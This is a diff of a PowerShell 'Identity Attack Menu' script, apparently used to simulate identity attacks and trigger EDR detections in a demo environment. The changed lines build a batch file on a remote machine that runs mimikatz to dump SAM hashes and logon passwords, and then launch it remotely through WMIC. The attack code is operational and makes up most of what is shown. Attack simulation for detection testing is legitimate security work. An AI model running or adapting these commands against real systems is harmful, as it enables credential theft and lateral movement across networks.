@@ -2,7 +2,7 @@
 #  Identity Attack Menu - Unmanaged Workstation
 #  Run as Administrator (demo account)
 #  Follows the phased scenario from portable_sender.py
-#  Version: 3.3 (2026-03-26)
+#  Version: 3.4 (2026-03-26)
 # ============================================================
 
 # --- Environment Variables (set these in cmd BEFORE running) ---
@@ -97,7 +97,7 @@ function Get-SvcRunbookHash {
     return $null
 }
 
-$scriptVersion = "3.3"
+$scriptVersion = "3.4"
 
 Write-Host "[+] IDP Attack Menu v$scriptVersion" -ForegroundColor Cyan
 Write-Host "[+] Config: DOMAIN=$env:ENV_DOMAIN  DC=$env:ENV_DC_IP  BL=$env:ENV_BL  DT=$env:ENV_DT" -ForegroundColor Green
@@ -700,14 +700,14 @@ public class CryptoMD4 {
                 'Write-Host ""'
                 'Write-Host "  [*] Writing run_dump.bat on $target ..." -ForegroundColor White'
                 '$batLine1 = [char]64 + "echo off"'
-                '$batLine2 = "C:\Temp\mimikatz.exe `"privilege::debug`" `"token::elevate`" `"log C:\Temp\cred_dump.log`" `"lsadump::sam`" `"sekurlsa::logonpasswords`" `"exit`""'
+                '$batLine2 = "C:\Temp\mimikatz.exe privilege::debug token::elevate lsadump::sam sekurlsa::logonpasswords exit > C:\Temp\cred_dump.log 2>&1"'
                 'Set-Content -Path "\\$target\C$\Temp\run_dump.bat" -Value @($batLine1, $batLine2) -Encoding ASCII'
                 'Write-Host "  [+] run_dump.bat written." -ForegroundColor Green'
                 'Write-Host ""'
                 'Write-Host "  [*] Executing run_dump.bat on $target via WMIC ..." -ForegroundColor White'
                 'Write-Host "  [*] Triggers: LSASS access + credential dumping on EDR-managed DT" -ForegroundColor Yellow'
                 'try {'
-                '    wmic /node:$target process call create "C:\Temp\run_dump.bat" 2>&1 | ForEach-Object { Write-Host "  $_" }'
+                '    wmic /node:$target process call create "cmd.exe /c C:\Temp\run_dump.bat" 2>&1 | ForEach-Object { Write-Host "  $_" }'
                 '    Write-Host ""'
                 '    Write-Host "  [*] Waiting 15 seconds for remote execution ..." -ForegroundColor Gray'
                 '    Start-Sleep -Seconds 15'
